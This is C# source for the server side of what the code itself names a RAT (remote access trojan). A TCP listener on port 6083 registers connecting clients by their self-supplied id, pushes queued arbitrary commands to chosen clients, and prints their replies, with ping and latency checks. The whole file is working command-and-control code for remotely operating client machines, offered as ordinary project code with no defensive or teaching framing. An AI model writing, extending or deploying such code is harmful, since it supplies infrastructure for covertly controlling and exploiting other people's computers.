using System.Net;
using System.Net.Sockets;
using System.Text;
using GeneralPurposeLib;

namespace RATServer; 

public static class RatServerListener {
    
    // Protocol:
    // All messages are terminated with a newline character
    // All messages are in the format of: <cmd>\n
    // cmd is a UTF-8 encoded string Encoding.UTF8.GetBytes("myRandomCmd\n")
    // The server will respond with a message in the format of: <response>\n
    // response is a UTF-8 encoded string Encoding.UTF8.GetBytes("myRandomResponse\n")
    // Actual new line characters should be escaped with a backslash so: "\\n"

    // (id, cmd)
    public static readonly List<(string, string)> CommandsToRun = new();
    public static readonly string[] InitCommands = {
        "init"
    };
    public static readonly List<string> Clients = new();
    public static bool AwaitingResponse = false;

    private static string ReceiveMessage(Stream stream) {
        // Read until we get a newline
        StringBuilder cmdBuilder = new();
        while (true) {
            int b = stream.ReadByte();
            if (b == -1) {
                break;
            }
            if (b == '\n') {
                break;
            }
            cmdBuilder.Append((char)b);
        }
        // unescape the newline
        return cmdBuilder.ToString().Replace("\\n", "\n");
    }
    
    private static void SendMessage(Socket socket, string data) {
        // Escape the newline character
        data = data.Replace("\n", "\\n");
        // Send the data
        socket.Send(Encoding.UTF8.GetBytes(data + "\n"));
    }
    
    public static async Task StartListening() {
        TcpListener server = new(IPAddress.Any, 6083);
        server.Start(8080);

        while (true) {
    
            // Accept a connection
            Socket socket = await server.AcceptSocketAsync();
            Logger.Debug("New connection: " + socket.RemoteEndPoint);
    
            Task task = HandleRequest(socket);
        }
    }

    public static async Task HandleRequest(Socket socket) {
        string id = Guid.NewGuid().ToString();
        socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.SendTimeout, 2000);

        foreach (string cmd in InitCommands) {
            // Send command to the client.
            Logger.Debug("Sending command: " + cmd);
            SendMessage(socket, cmd);

            // Get the response
            NetworkStream stream = new(socket);
            string data = ReceiveMessage(stream);
            switch (cmd) {
                case "ping" when data != "pong":
                    Logger.Debug("Socket disconnected: " + socket.RemoteEndPoint);
                    Clients.Remove(id);
                    return;
                case "init":
                    id = data;  // Use the client supplied id
                    break;
            }

            Logger.Debug("Client response to " + cmd + ": " + data);
        }
        
        Clients.Add(id);
        
        int currentCommand = CommandsToRun.Count;
        while (true) {
            // Get command or wait for next command.
            string cmd;
            
            startWait:
            if (currentCommand < CommandsToRun.Count) {
                if (CommandsToRun[currentCommand].Item1 != id) {
                    await Task.Delay(500);
                    goto startWait;
                }
                cmd = CommandsToRun[currentCommand].Item2;
                currentCommand++;
            } else {
                await Task.Delay(500);
                goto startWait;
            }
            
            // Send command to the client.
            Logger.Debug("Sending command: " + cmd);
            SendMessage(socket, cmd);

            // Get the response
            NetworkStream stream = new(socket);
            string data = ReceiveMessage(stream);
            switch (cmd) {
                case "ping" when data != "pong":
                    Console.WriteLine("Ping failed, socket disconnected: " + socket.RemoteEndPoint);
                    AwaitingResponse = false;
                    Clients.Remove(id);
                    return;
                case "latency": {
                    DateTime sent = DateTime.FromBinary(long.Parse(data));
                    DateTime received = DateTime.Now;
                    TimeSpan latency = received - sent;
                    Console.WriteLine("Latency of client: " + latency.TotalMilliseconds + "ms");
                    AwaitingResponse = false;
                    break;
                }
                default:
                    Console.WriteLine(data);
                    AwaitingResponse = false;
                    break;
            }
        }
    }
    
}